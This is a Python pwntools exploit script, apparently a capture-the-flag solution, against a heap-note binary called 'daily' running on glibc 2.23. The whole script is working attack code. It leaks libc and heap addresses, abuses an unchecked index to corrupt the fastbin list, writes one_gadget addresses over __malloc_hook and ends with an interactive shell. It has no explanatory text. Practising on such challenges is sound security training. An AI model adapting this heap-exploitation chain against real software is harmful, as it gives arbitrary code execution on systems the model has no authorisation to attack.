#encoding=utf-8
from pwn import *

context.log_level = "debug"
#p = process(["./daily"])
#只需要实用编写的记录模块即可运行
p = process(["./logger","./daily"])

# todo check libc version
libc = ELF("/glibc/2.23/64/lib/libc-2.23.so", checksec = False)


context.terminal = ["tmux","split","-h"]
def add(size, content):
    p.sendlineafter("choice:", "2")
    p.sendlineafter("daily:",str(size))
    p.sendafter("daily", content)

def show():
    p.sendlineafter("choice:","1")

def remove(index):
    p.sendlineafter("choice:","4")
    p.sendlineafter("daily:",str(index))

def change(index, content):
    p.sendlineafter("choice:","3")
    p.sendlineafter("daily:",str(index))
    p.sendlineafter("daily",content)


add(0x200,p64(0)*7)#0
add(0x200,"123")#1

remove(0)
add(0x200,"$")#0
show()
p.recvuntil("0 : $")
addr = "\x00"+p.recv(5)+"\x00"*2

addr = u64(addr)
print(hex(addr))
libc.addr = addr - libc.symbols["__memalign_hook"]

add(0x68,"123")#2
add(0x68,"123")#3
add(0x68,"333")#4

remove(3)
remove(2)

add(0x68,"^")
show()
p.recvuntil("^")
addr = "\x00" + p.recv(3) + "\x00"*4
if "4" in addr:
    addr = addr[:3] + "\x00"*5
addr = u64(addr) - 0x400

log.success("libc:"+hex(libc.addr))
log.success("heap:"+hex(addr))
heap = addr
change(0, (p64(0x100)+p64(heap+0x510))*5)

remove((heap-0x602050)/0x10)

change(4, p64(libc.addr+libc.symbols["__malloc_hook"]-35))

add(0x68,"1"*0x13+p64(0x3f3d6+libc.addr))
add(0x68,"1"*0x13+p64(0xd5bf7+libc.addr))
#gdb.attach(p)
remove((heap-0x602050+0x10)/0x10)
remove((heap-0x602050+0x20)/0x10)


p.interactive()
